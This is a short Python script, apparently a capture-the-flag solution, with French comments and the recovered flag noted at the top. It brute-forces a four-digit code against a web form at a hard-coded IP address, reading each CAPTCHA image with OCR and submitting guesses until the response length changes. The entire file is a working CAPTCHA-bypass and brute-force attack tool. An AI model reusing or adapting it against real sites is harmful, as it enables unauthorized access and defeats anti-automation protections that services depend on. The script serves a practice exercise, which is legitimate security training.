# flag: 3889
# Congratz ! FL A G -3 { N0_t1m3_to_Sl33p}


import requests
from PIL import Image
from io import BytesIO
import pytesseract
import re
from bs4 import BeautifulSoup
import logging
import time

# Logger setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.success = lambda msg: print(f"\033[92m[SUCCESS]\033[0m {msg}")

# URL settings
BASE_URL = "http://31.220.95.27:9002"
CAPTCHA_IMAGE_URL = f"{BASE_URL}/captcha.php"
FORM_URL = f"{BASE_URL}/captcha3/"

# Headers copied from Burp
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": FORM_URL,
    "Origin": BASE_URL,
    "Content-Type": "application/x-www-form-urlencoded",
}

def solve_captcha(session):
    """Essaye de résoudre un captcha et retourne le code s’il est valide (6 caractères)"""
    for _ in range(50):
        session.get(FORM_URL)  # init session
        r = session.get(CAPTCHA_IMAGE_URL)
        image = Image.open(BytesIO(r.content))
        raw_text = pytesseract.image_to_string(image, config='--psm 8')
        match = re.search(r'[0-9]{6}', raw_text)
        if match:
            captcha_code = match.group()
            logging.info(f"Captcha détecté : {captcha_code}")
            return captcha_code
        # logging.warning(f"Captcha illisible : '{raw_text.strip()}'. Nouvelle tentative...")
    raise Exception("Échec de lecture captcha après plusieurs essais.")

def try_flag(session, flag):
    captcha = solve_captcha(session)
    data = {
        "flag": str(flag),
        "captcha": captcha,
        "submit": "Submit Query"
    }

    response = session.post(FORM_URL, headers=HEADERS, data=data)

    content_length = int(response.headers.get("Content-Length", len(response.content)))
    logging.info(f"Testé flag {flag} (captcha: {captcha}) - Content-Length: {content_length}")

    if content_length > 490:
        logging.success(f"Flag TROUVÉ : {flag} ✅ (Content-Length: {content_length})")
        return True
    else:
        return False


def main():
    session = requests.Session()

    for flag in range(3800, 3900):
        try:
            if try_flag(session, flag):
                break
        except Exception as e:
            logging.error(f"Erreur lors du test du flag {flag}: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
